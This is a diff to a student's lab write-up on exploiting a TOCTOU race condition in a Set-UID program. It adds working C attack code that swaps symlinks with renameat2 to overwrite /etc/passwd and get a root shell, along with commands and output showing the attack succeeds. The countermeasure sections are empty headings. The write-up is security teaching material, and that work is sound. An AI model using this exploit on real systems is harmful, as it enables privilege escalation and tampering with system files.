@@ -48,7 +48,7 @@
     root
     ```
 
-### Task 2.A: The Real Attack
+### Task 2.B: The Real Attack
 - remove `sleep()`
 - typicall strategy is to run an attack program in parallel, perfect timing is very hard to achieve
 - write the attack program in C:
@@ -68,7 +68,7 @@
     done
     echo "STOP... The passwd file has been changed"
     ```
-- the core code of our target program `auto_atk.c`
+- the core code of our target program `atk.c`
     ```
     while(1) {
         symlink("/etc/passwd", "/tmp/XYZ");
@@ -79,18 +79,18 @@
     ```
 - **attack succeeded**: we run our attack program, repeatedly link `/tmp/XYZ` to `/etc/passwd` and a `seed` owned file `/tmp/XXX`, and then run `target_process.sh`
     ```
-    $ gcc -o auto_atk auto_atk.c
-    $ ./auto_atk
+    $ gcc -o atk atk.c
+    $ ./atk
     ```
     ```
-    $ ./target_process.sj
+    $ ./target_process.sh
     Permission denied
     Permission denied
     Permission denied
     Permission denied
     Permission denied
     STOP... The passwd file has been changed
-    $ test
+    $ su test
     Password:
     #
     ```
@@ -100,8 +100,50 @@
     $ ls -l /tmp/XYZ
     -rw-rw-r-- 1 root seed 0 Jan 30 23:45 /tmp/XYZ
     ```
+    - I run `atk` many times, and find that in most cases the attack fails within several seconds, which means that the time window between `unlink` and `symlink` is quite large, write a script to directly run 2 commands `ln -sf /etc/passwd /tmp/XYZ` and `ln -sf /tmp/XXX /tmp/XYZ` to reduce the time window between link and unlink, and the chance of success improved
 
-### Task 2.B: An Improved Attack
+### Task 2.C: An Improved Attack
 - when the owner of `/tmp/XYZ` becomes `root`, our attack program can never remove or `unlink()` it, because the `/tmp` folder has a "sticky" bit on, meaning that only the owner of the file can delete the file, even though the folder is world-writable
 - the reason for this problem is that out attack program itself has a race condition vulnerability, the attack program is context switched out right after `unlink()`, but before it links the name to another file (`symlink()`), and the target `Set-UID` program gets a change to run `fopen(fn, "a+")`, it creates a new file with `root` being the owner
 
+- In task `2.B`, I used `atk.sh` to reduce the possibility that the race condition between `unlink` and `link` happens, but it still exists, actually, there is a way to make `unlink` and `link` atomic in C
+    - `renameat2()` allows us to atomically switch 2 symlinks
+    - usage: `renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", RENAME_EXCHANGE)`
+- improved attack code `imp_atk.c`
+    ```
+    #define _GNU_SOURCE
+
+    #include <unistd.h>
+    #include <stdio.h>
+    int main() {
+        unlink("/tmp/XYZ");
+        unlink("/tmp/ABC");
+        symlink("/etc/passwd", "/tmp/XYZ");
+        symlink("/tmp/XXX"   , "/tmp/ABC");
+        while(1) {
+            // exchange 2 symlinks atomically
+            renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", RENAME_EXCHANGE);
+        }
+        return 0;
+    }
+    ```
+- test: in most cases, the attack succeed in seconds
+    ```
+    $ gcc -o imp_atk imp_atk.c
+    $ ./imp_atk
+    ```
+    ```
+    $ ./target_process.sh
+    Permission denied
+    Permission denied
+    STOP... The passwd file has been changed
+    $ su test
+    Password:
+    #
+    ```
+
+## Task 3: Countermeasures
+
+### Task 3.A: Principle of least privileges
+
+### Task 3.B: Using Ubuntu's built-in scheme
